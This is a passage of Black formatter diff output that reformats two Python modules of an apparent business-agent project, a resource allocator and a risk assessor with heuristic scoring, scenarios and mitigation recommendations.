+
         return unmet
-    
-    def _calculate_optimization_score(self, satisfaction: float, utilization: Dict[str, float], unmet_count: int, total_demands: int) -> float:
+
+    def _calculate_optimization_score(
+        self,
+        satisfaction: float,
+        utilization: Dict[str, float],
+        unmet_count: int,
+        total_demands: int,
+    ) -> float:
         """Calculate overall optimization score."""
         # Base score from satisfaction
         base_score = satisfaction * 0.4
-        
+
         # Utilization score (prefer 80-90% utilization)
-        avg_utilization = sum(utilization.values()) / len(utilization) if utilization else 0
+        avg_utilization = (
+            sum(utilization.values()) / len(utilization) if utilization else 0
+        )
         if 0.8 <= avg_utilization <= 0.9:
             utilization_score = 0.3
         else:
             utilization_score = 0.3 * (1 - abs(avg_utilization - 0.85) / 0.85)
-        
+
         # Demand fulfillment score
         fulfillment_rate = 1 - (unmet_count / total_demands) if total_demands > 0 else 1
         fulfillment_score = fulfillment_rate * 0.3
-        
+
         return base_score + utilization_score + fulfillment_score
-    
+
     async def _generate_recommendations(
         self,
         allocations: List[ResourceAllocation],
         unmet_demands: List[ResourceDemand],
         constraints: List[ResourceConstraint],
-        utilization: Dict[str, float]
+        utilization: Dict[str, float],
     ) -> List[str]:
         """Generate recommendations for resource allocation improvement."""
         recommendations = []
-        
+
         # Utilization recommendations
         for resource_type, util_rate in utilization.items():
             if util_rate > 0.95:
-                recommendations.append(f"Consider increasing {resource_type} capacity - currently at {util_rate:.1%} utilization")
+                recommendations.append(
+                    f"Consider increasing {resource_type} capacity - currently at {util_rate:.1%} utilization"
+                )
             elif util_rate < 0.5:
-                recommendations.append(f"Consider reallocating excess {resource_type} capacity - currently at {util_rate:.1%} utilization")
-        
+                recommendations.append(
+                    f"Consider reallocating excess {resource_type} capacity - currently at {util_rate:.1%} utilization"
+                )
+
         # Unmet demand recommendations
         if unmet_demands:
-            high_priority_unmet = [d for d in unmet_demands if d.urgency in [Priority.CRITICAL, Priority.HIGH]]
+            high_priority_unmet = [
+                d
+                for d in unmet_demands
+                if d.urgency in [Priority.CRITICAL, Priority.HIGH]
+            ]
             if high_priority_unmet:
-                recommendations.append(f"Address {len(high_priority_unmet)} high-priority unmet resource demands")
-        
+                recommendations.append(
+                    f"Address {len(high_priority_unmet)} high-priority unmet resource demands"
+                )
+
         # Allocation efficiency recommendations
         if len(allocations) > 10:
-            recommendations.append("Consider consolidating similar initiatives to improve resource efficiency")
-        
+            recommendations.append(
+                "Consider consolidating similar initiatives to improve resource efficiency"
+            )
+
         # Risk recommendations
         critical_allocations = [a for a in allocations if a.priority_score > 0.9]
         if len(critical_allocations) > 3:
-            recommendations.append("Monitor critical allocations closely and maintain contingency resources")
-        
+            recommendations.append(
+                "Monitor critical allocations closely and maintain contingency resources"
+            )
+
         return recommendations
-    
+
     async def _create_fallback_allocation(
         self,
         initiatives: List[BusinessInitiative],
-        constraints: List[ResourceConstraint]
+        constraints: List[ResourceConstraint],
     ) -> AllocationResult:
         """Create a basic fallback allocation when optimization fails."""
         allocations = []
-        
+
         # Simple equal distribution among top initiatives
-        top_initiatives = sorted(initiatives, key=lambda i: i.estimated_roi, reverse=True)[:3]
-        
+        top_initiatives = sorted(
+            initiatives, key=lambda i: i.estimated_roi, reverse=True
+        )[:3]
+
         for constraint in constraints:
-            available = constraint.total_available - constraint.allocated - constraint.reserved
+            available = (
+                constraint.total_available - constraint.allocated - constraint.reserved
+            )
             per_initiative = available / len(top_initiatives) if top_initiatives else 0
-            
+
             for initiative in top_initiatives:
                 if per_initiative > 0:
                     allocation = ResourceAllocation(
                         initiative_id=initiative.initiative_id,
                         resource_type=constraint.resource_type,
                         amount=per_initiative,
                         unit=constraint.unit,
                         justification=f"Equal distribution allocation for {initiative.name}",
-                        priority_score=0.5
+                        priority_score=0.5,
                     )
                     allocations.append(allocation)
-        
+
         return AllocationResult(
             allocations=allocations,
             total_satisfaction=0.5,
             unmet_demands=[],
             resource_utilization={c.resource_type: 0.5 for c in constraints},
             optimization_score=0.5,
-            recommendations=["Review allocation strategy", "Gather more detailed requirements"]
+            recommendations=[
+                "Review allocation strategy",
+                "Gather more detailed requirements",
+            ],
         )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/resource_allocator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/risk_assessor.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/risk_assessor.py	2025-06-19 04:03:40.106623+00:00
@@ -12,20 +12,26 @@
 from typing import Dict, List, Optional, Any, Tuple
 from dataclasses import dataclass
 import statistics
 
 from fs_agt_clean.core.models.business_models import (
-    RiskFactor, RiskLevel, BusinessInitiative, ExecutiveDecision,
-    FinancialMetrics, Priority, assess_risk_level
+    RiskFactor,
+    RiskLevel,
+    BusinessInitiative,
+    ExecutiveDecision,
+    FinancialMetrics,
+    Priority,
+    assess_risk_level,
 )
 
 logger = logging.getLogger(__name__)
 
 
 @dataclass
 class RiskCategory:
     """Risk category definition."""
+
     category_id: str
     name: str
     description: str
     typical_probability: float
     typical_impact: float
@@ -33,10 +39,11 @@
 
 
 @dataclass
 class RiskScenario:
     """Risk scenario analysis."""
+
     scenario_id: str
     name: str
     description: str
     probability: float
     financial_impact: Decimal
@@ -47,10 +54,11 @@
 
 
 @dataclass
 class RiskAssessmentResult:
     """Comprehensive risk assessment result."""
+
     overall_risk_level: RiskLevel
     risk_score: float
     identified_risks: List[RiskFactor]
     risk_scenarios: List[RiskScenario]
     mitigation_plan: List[str]
@@ -60,11 +68,11 @@
     confidence_score: float
 
 
 class RiskAssessor:
     """Advanced risk assessment and mitigation planning system."""
-    
+
     def __init__(self):
         """Initialize the risk assessor."""
         # Standard risk categories for business operations
         self.risk_categories = {
             "financial": RiskCategory(
@@ -75,12 +83,12 @@
                 typical_impact=0.7,
                 mitigation_strategies=[
                     "Diversify revenue streams",
                     "Maintain cash reserves",
                     "Implement financial controls",
-                    "Regular financial monitoring"
-                ]
+                    "Regular financial monitoring",
+                ],
             ),
             "operational": RiskCategory(
                 category_id="operational",
                 name="Operational Risk",
                 description="Risks related to business operations and processes",
@@ -88,12 +96,12 @@
                 typical_impact=0.5,
                 mitigation_strategies=[
                     "Process standardization",
                     "Staff training and development",
                     "Backup systems and procedures",
-                    "Quality assurance programs"
-                ]
+                    "Quality assurance programs",
+                ],
             ),
             "market": RiskCategory(
                 category_id="market",
                 name="Market Risk",
                 description="Risks related to market conditions and competition",
@@ -101,12 +109,12 @@
                 typical_impact=0.6,
                 mitigation_strategies=[
                     "Market diversification",
                     "Competitive intelligence",
                     "Customer relationship management",
-                    "Product differentiation"
-                ]
+                    "Product differentiation",
+                ],
             ),
             "technology": RiskCategory(
                 category_id="technology",
                 name="Technology Risk",
                 description="Risks related to technology systems and cybersecurity",
@@ -114,12 +122,12 @@
                 typical_impact=0.8,
                 mitigation_strategies=[
                     "Regular system updates",
                     "Cybersecurity measures",
                     "Data backup and recovery",
-                    "Technology redundancy"
-                ]
+                    "Technology redundancy",
+                ],
             ),
             "regulatory": RiskCategory(
                 category_id="regulatory",
                 name="Regulatory Risk",
                 description="Risks related to regulatory compliance and legal issues",
@@ -127,12 +135,12 @@
                 typical_impact=0.9,
                 mitigation_strategies=[
                     "Compliance monitoring",
                     "Legal consultation",
                     "Policy documentation",
-                    "Regular audits"
-                ]
+                    "Regular audits",
+                ],
             ),
             "strategic": RiskCategory(
                 category_id="strategic",
                 name="Strategic Risk",
                 description="Risks related to strategic decisions and direction",
@@ -140,335 +148,411 @@
                 typical_impact=0.7,
                 mitigation_strategies=[
                     "Strategic planning reviews",
                     "Scenario planning",
                     "Stakeholder engagement",
-                    "Performance monitoring"
-                ]
-            )
+                    "Performance monitoring",
+                ],
+            ),
         }
-        
+
         logger.info("Risk assessor initialized")
-    
+
     async def assess_comprehensive_risk(
         self,
         context: Dict[str, Any],
         initiatives: Optional[List[BusinessInitiative]] = None,
         decisions: Optional[List[ExecutiveDecision]] = None,
-        risk_tolerance: RiskLevel = RiskLevel.MEDIUM
+        risk_tolerance: RiskLevel = RiskLevel.MEDIUM,
     ) -> RiskAssessmentResult:
         """
         Perform comprehensive risk assessment.
-        
+
         Args:
             context: Business context and current situation
             initiatives: Business initiatives to assess
             decisions: Executive decisions to assess
             risk_tolerance: Organization's risk tolerance level
-            
+
         Returns:
             RiskAssessmentResult with comprehensive analysis
         """
         try:
             # Identify risks from multiple sources
-            identified_risks = await self._identify_risks(context, initiatives, decisions)
-            
+            identified_risks = await self._identify_risks(
+                context, initiatives, decisions
+            )
+
             # Analyze risk scenarios
-            risk_scenarios = await self._analyze_risk_scenarios(identified_risks, context)
-            
+            risk_scenarios = await self._analyze_risk_scenarios(
+                identified_risks, context
+            )
+
             # Calculate overall risk score
-            risk_score = self._calculate_overall_risk_score(identified_risks, risk_scenarios)
-            
+            risk_score = self._calculate_overall_risk_score(
+                identified_risks, risk_scenarios
+            )
+
             # Determine overall risk level
             overall_risk_level = self._determine_risk_level(risk_score)
-            
+
             # Create mitigation plan
-            mitigation_plan = await self._create_mitigation_plan(identified_risks, risk_scenarios)
-            
+            mitigation_plan = await self._create_mitigation_plan(
+                identified_risks, risk_scenarios
+            )
+
             # Define monitoring requirements
-            monitoring_requirements = self._define_monitoring_requirements(identified_risks)
-            
+            monitoring_requirements = self._define_monitoring_requirements(
+                identified_risks
+            )
+
             # Generate contingency recommendations
-            contingency_recommendations = await self._generate_contingency_recommendations(
-                risk_scenarios, overall_risk_level
-            )
-            
+            contingency_recommendations = (
+                await self._generate_contingency_recommendations(
+                    risk_scenarios, overall_risk_level
+                )
+            )
+
             # Assess risk tolerance alignment
-            tolerance_alignment = self._assess_risk_tolerance_alignment(overall_risk_level, risk_tolerance)
-            
+            tolerance_alignment = self._assess_risk_tolerance_alignment(
+                overall_risk_level, risk_tolerance
+            )
+
             # Calculate confidence score
-            confidence_score = self._calculate_confidence_score(identified_risks, context)
-            
+            confidence_score = self._calculate_confidence_score(
+                identified_risks, context
+            )
+
             return RiskAssessmentResult(
                 overall_risk_level=overall_risk_level,
                 risk_score=risk_score,
                 identified_risks=identified_risks,
                 risk_scenarios=risk_scenarios,
                 mitigation_plan=mitigation_plan,
                 monitoring_requirements=monitoring_requirements,
                 contingency_recommendations=contingency_recommendations,
                 risk_tolerance_alignment=tolerance_alignment,
-                confidence_score=confidence_score
-            )
-            
+                confidence_score=confidence_score,
+            )
+
         except Exception as e:
             logger.error(f"Error in comprehensive risk assessment: {e}")
             return await self._create_fallback_assessment(risk_tolerance)
-    
+
     async def _identify_risks(
         self,
         context: Dict[str, Any],
         initiatives: Optional[List[BusinessInitiative]],
-        decisions: Optional[List[ExecutiveDecision]]
+        decisions: Optional[List[ExecutiveDecision]],
     ) -> List[RiskFactor]:
         """Identify risks from various sources."""
         risks = []
-        
+
         # Context-based risks
         context_risks = await self._identify_context_risks(context)
         risks.extend(context_risks)
-        
+
         # Initiative-based risks
         if initiatives:
             for initiative in initiatives:
                 initiative_risks = await self._identify_initiative_risks(initiative)
                 risks.extend(initiative_risks)
-        
+
         # Decision-based risks
         if decisions:
             for decision in decisions:
                 decision_risks = await self._identify_decision_risks(decision)
                 risks.extend(decision_risks)
-        
+
         # Remove duplicates and consolidate similar risks
         consolidated_risks = self._consolidate_risks(risks)
-        
+
         return consolidated_risks
-    
-    async def _identify_context_risks(self, context: Dict[str, Any]) -> List[RiskFactor]:
+
+    async def _identify_context_risks(
+        self, context: Dict[str, Any]
+    ) -> List[RiskFactor]:
         """Identify risks based on business context."""
         risks = []
-        
+
         # Financial risks
         if context.get("financial_health") == "weak":
-            risks.append(RiskFactor(
-                factor_id="financial_weakness",
-                name="Financial Weakness",
-                description="Current financial position indicates potential cash flow issues",
-                probability=0.6,
-                impact=0.8,
-                risk_level=assess_risk_level(0.6, 0.8),
-                mitigation_strategies=self.risk_categories["financial"].mitigation_strategies
-            ))
-        
+            risks.append(
+                RiskFactor(
+                    factor_id="financial_weakness",
+                    name="Financial Weakness",
+                    description="Current financial position indicates potential cash flow issues",
+                    probability=0.6,
+                    impact=0.8,
+                    risk_level=assess_risk_level(0.6, 0.8),
+                    mitigation_strategies=self.risk_categories[
+                        "financial"
+                    ].mitigation_strategies,
+                )
+            )
+
         # Market risks
         if context.get("market_volatility") == "high":
-            risks.append(RiskFactor(
-                factor_id="market_volatility",
-                name="Market Volatility",
-                description="High market volatility may impact business performance",
-                probability=0.7,
-                impact=0.6,
-                risk_level=assess_risk_level(0.7, 0.6),
-                mitigation_strategies=self.risk_categories["market"].mitigation_strategies
-            ))
-        
+            risks.append(
+                RiskFactor(
+                    factor_id="market_volatility",
+                    name="Market Volatility",
+                    description="High market volatility may impact business performance",
+                    probability=0.7,
+                    impact=0.6,
+                    risk_level=assess_risk_level(0.7, 0.6),
+                    mitigation_strategies=self.risk_categories[
+                        "market"
+                    ].mitigation_strategies,
+                )
+            )
+
         # Competitive risks
         if context.get("competition_intensity") == "high":
-            risks.append(RiskFactor(
-                factor_id="competitive_pressure",
-                name="Competitive Pressure",
-                description="Intense competition may erode market share and margins",
-                probability=0.8,
-                impact=0.5,
-                risk_level=assess_risk_level(0.8, 0.5),
-                mitigation_strategies=self.risk_categories["market"].mitigation_strategies
-            ))
-        
+            risks.append(
+                RiskFactor(
+                    factor_id="competitive_pressure",
+                    name="Competitive Pressure",
+                    description="Intense competition may erode market share and margins",
+                    probability=0.8,
+                    impact=0.5,
+                    risk_level=assess_risk_level(0.8, 0.5),
+                    mitigation_strategies=self.risk_categories[
+                        "market"
+                    ].mitigation_strategies,
+                )
+            )
+
         # Operational risks
         if context.get("operational_efficiency", 1.0) < 0.7:
-            risks.append(RiskFactor(
-                factor_id="operational_inefficiency",
-                name="Operational Inefficiency",
-                description="Low operational efficiency may impact profitability",
-                probability=0.5,
-                impact=0.6,
-                risk_level=assess_risk_level(0.5, 0.6),
-                mitigation_strategies=self.risk_categories["operational"].mitigation_strategies
-            ))
-        
+            risks.append(
+                RiskFactor(
+                    factor_id="operational_inefficiency",
+                    name="Operational Inefficiency",
+                    description="Low operational efficiency may impact profitability",
+                    probability=0.5,
+                    impact=0.6,
+                    risk_level=assess_risk_level(0.5, 0.6),
+                    mitigation_strategies=self.risk_categories[
+                        "operational"
+                    ].mitigation_strategies,
+                )
+            )
+
         return risks
-    
-    async def _identify_initiative_risks(self, initiative: BusinessInitiative) -> List[RiskFactor]:
+
+    async def _identify_initiative_risks(
+        self, initiative: BusinessInitiative
+    ) -> List[RiskFactor]:
         """Identify risks specific to a business initiative."""
         risks = []
-        
+
         # High investment risk
         if initiative.estimated_cost > Decimal("100000"):
-            risks.append(RiskFactor(
-                factor_id=f"high_investment_{initiative.initiative_id}",
-                name="High Investment Risk",
-                description=f"Large investment required for {initiative.name}",
-                probability=0.3,
-                impact=0.8,
-                risk_level=assess_risk_level(0.3, 0.8),
-                mitigation_strategies=["Phased implementation", "Milestone-based funding"]
-            ))
-        
+            risks.append(
+                RiskFactor(
+                    factor_id=f"high_investment_{initiative.initiative_id}",
+                    name="High Investment Risk",
+                    description=f"Large investment required for {initiative.name}",
+                    probability=0.3,
+                    impact=0.8,
+                    risk_level=assess_risk_level(0.3, 0.8),
+                    mitigation_strategies=[
+                        "Phased implementation",
+                        "Milestone-based funding",
+                    ],
+                )
+            )
+
         # Timeline risk
         if initiative.timeline_months > 12:
-            risks.append(RiskFactor(
-                factor_id=f"timeline_risk_{initiative.initiative_id}",
-                name="Timeline Risk",
-                description=f"Extended timeline for {initiative.name} increases execution risk",
-                probability=0.4,
-                impact=0.5,
-                risk_level=assess_risk_level(0.4, 0.5),
-                mitigation_strategies=["Regular milestone reviews", "Agile methodology"]
-            ))
-        
+            risks.append(
+                RiskFactor(
+                    factor_id=f"timeline_risk_{initiative.initiative_id}",
+                    name="Timeline Risk",
+                    description=f"Extended timeline for {initiative.name} increases execution risk",
+                    probability=0.4,
+                    impact=0.5,
+                    risk_level=assess_risk_level(0.4, 0.5),
+                    mitigation_strategies=[
+                        "Regular milestone reviews",
+                        "Agile methodology",
+                    ],
+                )
+            )
+
         # ROI risk
         if initiative.estimated_roi < 15:
-            risks.append(RiskFactor(
-                factor_id=f"low_roi_{initiative.initiative_id}",
-                name="Low ROI Risk",
-                description=f"Low expected ROI for {initiative.name}",
-                probability=0.5,
-                impact=0.6,
-                risk_level=assess_risk_level(0.5, 0.6),
-                mitigation_strategies=["Enhanced value proposition", "Cost optimization"]
-            ))
-        
+            risks.append(
+                RiskFactor(
+                    factor_id=f"low_roi_{initiative.initiative_id}",
+                    name="Low ROI Risk",
+                    description=f"Low expected ROI for {initiative.name}",
+                    probability=0.5,
+                    impact=0.6,
+                    risk_level=assess_risk_level(0.5, 0.6),
+                    mitigation_strategies=[
+                        "Enhanced value proposition",
+                        "Cost optimization",
+                    ],
+                )
+            )
+
         # Add existing initiative risks
         for i, risk_desc in enumerate(initiative.risks):
-            risks.append(RiskFactor(
-                factor_id=f"initiative_risk_{initiative.initiative_id}_{i}",
-                name=f"Initiative Risk {i+1}",
-                description=risk_desc,
-                probability=0.4,
-                impact=0.5,
-                risk_level=assess_risk_level(0.4, 0.5),
-                mitigation_strategies=["Monitor and mitigate"]
-            ))
-        
+            risks.append(
+                RiskFactor(
+                    factor_id=f"initiative_risk_{initiative.initiative_id}_{i}",
+                    name=f"Initiative Risk {i+1}",
+                    description=risk_desc,
+                    probability=0.4,
+                    impact=0.5,
+                    risk_level=assess_risk_level(0.4, 0.5),
+                    mitigation_strategies=["Monitor and mitigate"],
+                )
+            )
+
         return risks
-    
-    async def _identify_decision_risks(self, decision: ExecutiveDecision) -> List[RiskFactor]:
+
+    async def _identify_decision_risks(
+        self, decision: ExecutiveDecision
+    ) -> List[RiskFactor]:
         """Identify risks specific to an executive decision."""
         risks = []
-        
+
         # High-impact decision risk
-        if decision.financial_impact and decision.financial_impact.revenue > Decimal("50000"):
-            risks.append(RiskFactor(
-                factor_id=f"decision_impact_{decision.decision_id}",
-                name="High-Impact Decision Risk",
-                description=f"High financial impact of decision: {decision.title}",
-                probability=0.3,
-                impact=0.7,
-                risk_level=assess_risk_level(0.3, 0.7),
-                mitigation_strategies=["Detailed analysis", "Stakeholder review"]
-            ))
-        
+        if decision.financial_impact and decision.financial_impact.revenue > Decimal(
+            "50000"
+        ):
+            risks.append(
+                RiskFactor(
+                    factor_id=f"decision_impact_{decision.decision_id}",
+                    name="High-Impact Decision Risk",
+                    description=f"High financial impact of decision: {decision.title}",
+                    probability=0.3,
+                    impact=0.7,
+                    risk_level=assess_risk_level(0.3, 0.7),
+                    mitigation_strategies=["Detailed analysis", "Stakeholder review"],
+                )
+            )
+
         # Low confidence risk
         if decision.confidence_score < 0.7:
-            risks.append(RiskFactor(
-                factor_id=f"low_confidence_{decision.decision_id}",
-                name="Low Confidence Risk",
-                description=f"Low confidence in decision: {decision.title}",
-                probability=0.6,
-                impact=0.5,
-                risk_level=assess_risk_level(0.6, 0.5),
-                mitigation_strategies=["Additional analysis", "Expert consultation"]
-            ))
-        
+            risks.append(
+                RiskFactor(
+                    factor_id=f"low_confidence_{decision.decision_id}",
+                    name="Low Confidence Risk",
+                    description=f"Low confidence in decision: {decision.title}",
+                    probability=0.6,
+                    impact=0.5,
+                    risk_level=assess_risk_level(0.6, 0.5),
+                    mitigation_strategies=[
+                        "Additional analysis",
+                        "Expert consultation",
+                    ],
+                )
+            )
+
         # Add existing decision risks
         risks.extend(decision.risk_assessment)
-        
+
         return risks
-    
+
     def _consolidate_risks(self, risks: List[RiskFactor]) -> List[RiskFactor]:
         """Consolidate and remove duplicate risks."""
         # Simple consolidation - remove exact duplicates
         seen_descriptions = set()
         consolidated = []
-        
+
         for risk in risks:
             if risk.description not in seen_descriptions:
                 consolidated.append(risk)
                 seen_descriptions.add(risk.description)
-        
+
         return consolidated
-    
-    async def _analyze_risk_scenarios(self, risks: List[RiskFactor], context: Dict[str, Any]) -> List[RiskScenario]:
+
+    async def _analyze_risk_scenarios(
+        self, risks: List[RiskFactor], context: Dict[str, Any]
+    ) -> List[RiskScenario]:
         """Analyze potential risk scenarios."""
         scenarios = []
-        
+
         # Best case scenario
-        scenarios.append(RiskScenario(
-            scenario_id="best_case",
-            name="Best Case Scenario",
-            description="Minimal risk materialization with effective mitigation",
-            probability=0.3,
-            financial_impact=Decimal("5000"),
-            operational_impact="Minimal disruption",
-            timeline_impact="No delays",
-            mitigation_cost=Decimal("2000"),
-            residual_risk=0.1
-        ))
-        
+        scenarios.append(
+            RiskScenario(
+                scenario_id="best_case",
+                name="Best Case Scenario",
+                description="Minimal risk materialization with effective mitigation",
+                probability=0.3,
+                financial_impact=Decimal("5000"),
+                operational_impact="Minimal disruption",
+                timeline_impact="No delays",
+                mitigation_cost=Decimal("2000"),
+                residual_risk=0.1,
+            )
+        )
+
         # Most likely scenario
-        avg_probability = statistics.mean([r.probability for r in risks]) if risks else 0.3
+        avg_probability = (
+            statistics.mean([r.probability for r in risks]) if risks else 0.3
+        )
         avg_impact = statistics.mean([r.impact for r in risks]) if risks else 0.5
-        
-        scenarios.append(RiskScenario(
-            scenario_id="most_likely",
-            name="Most Likely Scenario",
-            description="Expected risk materialization based on current assessment",
-            probability=avg_probability,
-            financial_impact=Decimal(str(avg_impact * 25000)),
-            operational_impact="Moderate impact on operations",
-            timeline_impact="Minor delays possible",
-            mitigation_cost=Decimal(str(avg_impact * 10000)),
-            residual_risk=avg_probability * avg_impact * 0.5
-        ))
-        
+
+        scenarios.append(
+            RiskScenario(
+                scenario_id="most_likely",
+                name="Most Likely Scenario",
+                description="Expected risk materialization based on current assessment",
+                probability=avg_probability,
+                financial_impact=Decimal(str(avg_impact * 25000)),
+                operational_impact="Moderate impact on operations",
+                timeline_impact="Minor delays possible",
+                mitigation_cost=Decimal(str(avg_impact * 10000)),
+                residual_risk=avg_probability * avg_impact * 0.5,
+            )
+        )
+
         # Worst case scenario
         max_impact = max([r.impact for r in risks]) if risks else 0.8
-        
-        scenarios.append(RiskScenario(
-            scenario_id="worst_case",
-            name="Worst Case Scenario",
-            description="Multiple high-impact risks materialize simultaneously",
-            probability=0.1,
-            financial_impact=Decimal(str(max_impact * 100000)),
-            operational_impact="Significant operational disruption",
-            timeline_impact="Major delays and setbacks",
-            mitigation_cost=Decimal(str(max_impact * 50000)),
-            residual_risk=max_impact * 0.8
-        ))
-        
+
+        scenarios.append(
+            RiskScenario(
+                scenario_id="worst_case",
+                name="Worst Case Scenario",
+                description="Multiple high-impact risks materialize simultaneously",
+                probability=0.1,
+                financial_impact=Decimal(str(max_impact * 100000)),
+                operational_impact="Significant operational disruption",
+                timeline_impact="Major delays and setbacks",
+                mitigation_cost=Decimal(str(max_impact * 50000)),
+                residual_risk=max_impact * 0.8,
+            )
+        )
+
         return scenarios
-    
-    def _calculate_overall_risk_score(self, risks: List[RiskFactor], scenarios: List[RiskScenario]) -> float:
+
+    def _calculate_overall_risk_score(
+        self, risks: List[RiskFactor], scenarios: List[RiskScenario]
+    ) -> float:
         """Calculate overall risk score."""
         if not risks:
             return 0.1
-        
+
         # Risk-based score
         risk_scores = [r.probability * r.impact for r in risks]
         avg_risk_score = statistics.mean(risk_scores)
-        
+
         # Scenario-based adjustment
         scenario_score = 0.0
         for scenario in scenarios:
             scenario_score += scenario.probability * scenario.residual_risk
-        
+
         # Combined score
         combined_score = (avg_risk_score * 0.7) + (scenario_score * 0.3)
-        
+
         return min(combined_score, 1.0)
-    
+
     def _determine_risk_level(self, risk_score: float) -> RiskLevel:
         """Determine overall risk level from risk score."""
         if risk_score >= 0.8:
             return RiskLevel.VERY_HIGH
         elif risk_score >= 0.6:
@@ -477,131 +561,158 @@
             return RiskLevel.MEDIUM
         elif risk_score >= 0.2:
             return RiskLevel.LOW
         else:
             return RiskLevel.VERY_LOW
-    
-    async def _create_mitigation_plan(self, risks: List[RiskFactor], scenarios: List[RiskScenario]) -> List[str]:
+
+    async def _create_mitigation_plan(
+        self, risks: List[RiskFactor], scenarios: List[RiskScenario]
+    ) -> List[str]:
         """Create comprehensive risk mitigation plan."""
         mitigation_plan = []
-        
+
         # High-priority risk mitigations
-        high_risks = [r for r in risks if r.risk_level in [RiskLevel.HIGH, RiskLevel.VERY_HIGH]]
+        high_risks = [
+            r for r in risks if r.risk_level in [RiskLevel.HIGH, RiskLevel.VERY_HIGH]
+        ]
         for risk in high_risks:
             mitigation_plan.extend(risk.mitigation_strategies[:2])  # Top 2 strategies
-        
+
         # General mitigation strategies
-        mitigation_plan.extend([
-            "Establish risk monitoring and early warning systems",
-            "Develop contingency plans for high-impact scenarios",
-            "Regular risk assessment reviews and updates",
-            "Maintain adequate insurance coverage",
-            "Build organizational resilience and adaptability"
-        ])
-        
+        mitigation_plan.extend(
+            [
+                "Establish risk monitoring and early warning systems",
+                "Develop contingency plans for high-impact scenarios",
+                "Regular risk assessment reviews and updates",
+                "Maintain adequate insurance coverage",
+                "Build organizational resilience and adaptability",
+            ]
+        )
+
         # Remove duplicates
         return list(set(mitigation_plan))
-    
+
     def _define_monitoring_requirements(self, risks: List[RiskFactor]) -> List[str]:
         """Define risk monitoring requirements."""
         monitoring = [
             "Monthly risk assessment reviews",
             "Key risk indicator (KRI) tracking",
             "Stakeholder risk communication",
-            "Risk register maintenance"
+            "Risk register maintenance",
         ]
-        
+
         # Add specific monitoring for high risks
-        high_risks = [r for r in risks if r.risk_level in [RiskLevel.HIGH, RiskLevel.VERY_HIGH]]
+        high_risks = [
+            r for r in risks if r.risk_level in [RiskLevel.HIGH, RiskLevel.VERY_HIGH]
+        ]
         if high_risks:
-            monitoring.extend([
-                "Weekly monitoring of high-risk factors",
-                "Automated alerts for risk threshold breaches",
-                "Executive risk dashboard updates"
-            ])
-        
+            monitoring.extend(
+                [
+                    "Weekly monitoring of high-risk factors",
+                    "Automated alerts for risk threshold breaches",
+                    "Executive risk dashboard updates",
+                ]
+            )
+
         return monitoring
-    
+
     async def _generate_contingency_recommendations(
-        self, 
-        scenarios: List[RiskScenario], 
-        overall_risk_level: RiskLevel
+        self, scenarios: List[RiskScenario], overall_risk_level: RiskLevel
     ) -> List[str]:
         """Generate contingency recommendations."""
         recommendations = []
-        
+
         if overall_risk_level in [RiskLevel.HIGH, RiskLevel.VERY_HIGH]:
-            recommendations.extend([
-                "Establish crisis management team and procedures",
-                "Maintain higher cash reserves for contingencies",
-                "Develop alternative business continuity plans",
-                "Consider risk transfer mechanisms (insurance, partnerships)"
-            ])
-        
+            recommendations.extend(
+                [
+                    "Establish crisis management team and procedures",
+                    "Maintain higher cash reserves for contingencies",
+                    "Develop alternative business continuity plans",
+                    "Consider risk transfer mechanisms (insurance, partnerships)",
+                ]
+            )
+
         # Scenario-specific recommendations
         worst_case = next((s for s in scenarios if s.scenario_id == "worst_case"), None)
         if worst_case and worst_case.financial_impact > Decimal("50000"):
             recommendations.append("Establish emergency funding sources")
-        
-        recommendations.extend([
-            "Regular scenario planning exercises",
-            "Cross-training of key personnel",
-            "Vendor and supplier diversification",
-            "Technology backup and recovery systems"
-        ])
-        
+
+        recommendations.extend(
+            [
+                "Regular scenario planning exercises",
+                "Cross-training of key personnel",
+                "Vendor and supplier diversification",
+                "Technology backup and recovery systems",
+            ]
+        )
+
         return recommendations
-    
-    def _assess_risk_tolerance_alignment(self, overall_risk_level: RiskLevel, risk_tolerance: RiskLevel) -> str:
+
+    def _assess_risk_tolerance_alignment(
+        self, overall_risk_level: RiskLevel, risk_tolerance: RiskLevel
+    ) -> str:
         """Assess alignment between risk level and tolerance."""
-        risk_levels = [RiskLevel.VERY_LOW, RiskLevel.LOW, RiskLevel.MEDIUM, RiskLevel.HIGH, RiskLevel.VERY_HIGH]
-        
+        risk_levels = [
+            RiskLevel.VERY_LOW,
+            RiskLevel.LOW,
+            RiskLevel.MEDIUM,
+            RiskLevel.HIGH,
+            RiskLevel.VERY_HIGH,
+        ]
+
         risk_index = risk_levels.index(overall_risk_level)
         tolerance_index = risk_levels.index(risk_tolerance)
-        
+
         if risk_index <= tolerance_index:
             return "Aligned - Risk level within acceptable tolerance"
         elif risk_index == tolerance_index + 1:
             return "Caution - Risk level slightly above tolerance"
         else:
             return "Misaligned - Risk level significantly exceeds tolerance"
-    
-    def _calculate_confidence_score(self, risks: List[RiskFactor], context: Dict[str, Any]) -> float:
+
+    def _calculate_confidence_score(
+        self, risks: List[RiskFactor], context: Dict[str, Any]
+    ) -> float:
         """Calculate confidence score for the risk assessment."""
         base_confidence = 0.7
-        
+
         # Adjust based on data availability
         if context:
             data_quality = len(context) / 10  # Assume 10 is comprehensive
             base_confidence += min(data_quality * 0.2, 0.2)
-        
+
         # Adjust based on risk identification completeness
         if len(risks) >= 5:
             base_confidence += 0.1
         elif len(risks) < 2:
             base_confidence -= 0.2
-        
+
         return max(0.1, min(0.95, base_confidence))
-    
-    async def _create_fallback_assessment(self, risk_tolerance: RiskLevel) -> RiskAssessmentResult:
+
+    async def _create_fallback_assessment(
+        self, risk_tolerance: RiskLevel
+    ) -> RiskAssessmentResult:
         """Create fallback assessment when detailed analysis fails."""
         basic_risk = RiskFactor(
             factor_id="general_business_risk",
             name="General Business Risk",
             description="Standard business operational risks",
             probability=0.4,
             impact=0.5,
             risk_level=RiskLevel.MEDIUM,
-            mitigation_strategies=["Regular monitoring", "Best practices implementation"]
+            mitigation_strategies=[
+                "Regular monitoring",
+                "Best practices implementation",
+            ],
         )
-        
+
         return RiskAssessmentResult(
             overall_risk_level=RiskLevel.MEDIUM,
             risk_score=0.4,
             identified_risks=[basic_risk],
             risk_scenarios=[],
             mitigation_plan=["Implement standard risk management practices"],
             monitoring_requirements=["Monthly risk reviews"],
             contingency_recommendations=["Maintain contingency reserves"],
             risk_tolerance_alignment="Requires detailed assessment",
